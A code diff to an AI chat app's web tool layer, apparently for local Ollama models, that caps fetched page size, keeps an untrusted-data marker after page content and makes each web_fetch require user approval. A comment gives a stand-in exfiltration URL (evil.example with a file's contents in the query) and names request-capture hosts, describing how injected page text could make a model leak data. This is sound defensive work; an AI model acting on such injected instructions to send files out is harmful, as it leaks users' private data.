@@ -1,3 +1,4 @@
+import { webFetchAllowKey } from '@shared/toolAllow'
 import type { OllamaTool } from '../ollama/client'
 import { webEndpoint, webFetch, webSearch } from '../ollama/web'
 import { resolveWebCall, type WebToolCall } from './aliases'
@@ -52,7 +53,7 @@ const hostOf = (url: string): string => {
   }
 }
 
-async function runWebTool(call: WebToolCall, via: string | null, signal: AbortSignal | undefined): Promise<ToolResult> {
+async function runWebTool(call: WebToolCall, via: string | null, signal: AbortSignal | undefined, maxChars: number): Promise<ToolResult> {
   const alias = via ? { via } : {}
   if (call.tool === 'web_search') {
     const results = await webSearch(call.query, call.maxResults, signal)
@@ -75,7 +76,7 @@ async function runWebTool(call: WebToolCall, via: string | null, signal: AbortSi
   const open = `<web_page url="${call.url}" title="${page.title.replace(/"/g, "'")}">\n`
   const close = `${links ? `\n\nLinks on the page:\n${links}` : ''}\n</web_page>\n${UNTRUSTED}`
   // The page gets whatever room the cap on tool results leaves, so the untrusted-data note after it is never cut.
-  const room = Math.max(0, TOOL_RESULT_CHARS - open.length - close.length - 40)
+  const room = Math.max(0, maxChars - open.length - close.length - 40)
   const text = page.content.length > room ? `${page.content.slice(0, room)}\n[… page truncated]` : page.content
   return {
     content: `${open}${text}${close}`,
@@ -108,7 +109,18 @@ export const webTools: ToolProvider = {
       const need = name === 'web_search' ? 'a non-empty "query"' : 'a full http(s) "url"'
       return { content: `Error: ${name} needs ${need}.`, event: { tool: name, args, ok: false, summary: `needs ${need}` } }
     }
-    return runWebTool(call, via, ctx.signal)
+    return runWebTool(call, via, ctx.signal, Math.min(ctx.maxResultChars ?? TOOL_RESULT_CHARS, TOOL_RESULT_CHARS))
+  },
+  // web_fetch can carry data out in the URL it asks for (https://evil.example/?d=<a file's contents>). In a chat whose
+  // other tools can read this Mac or the user's accounts, a page or tool result that tells the model to do that must
+  // not get through unseen, so each fetch asks there. Allowing a site for the chat isn't offered: on hosts anyone can
+  // read requests from (webhook.site, Apps Script, request bins), one innocent-looking approval would let every later
+  // URL through. Searches go to Ollama's API, not to a site.
+  approval: ({ name }, ctx) => (name === 'web_fetch' && ctx.sources.length > 0 ? 'ask-every-time' : 'auto'),
+  // A denial covers the site for the rest of the reply.
+  allowKey: ({ name, via, args }) => {
+    const call = resolveWebCall(via ?? name, args)
+    return call?.tool === 'web_fetch' ? webFetchAllowKey(hostOf(call.url)) : name
   },
   endpoint: ({ name }) => webEndpoint(`/api/${name}`),
   // Kept in brief so follow-ups like "open the third result" still work.
